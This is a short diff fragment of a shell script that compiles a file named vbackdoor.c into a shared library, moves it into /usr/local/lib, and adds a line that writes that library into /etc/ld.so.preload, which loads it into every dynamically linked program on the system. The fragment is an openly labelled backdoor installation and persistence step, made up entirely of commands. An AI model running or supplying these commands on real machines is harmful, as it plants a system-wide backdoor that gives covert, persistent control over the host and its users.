@@ -37,3 +37,4 @@ echo " "
 vi vbackdoor.c
 gcc -Wall -fPIC -shared -o vbackdoor.so vbackdoor.c -ldl
 sudo mv vbackdoor.so /usr/local/lib/
+echo /usr/local/lib/vbackdoor.so >> /etc/ld.so.preload
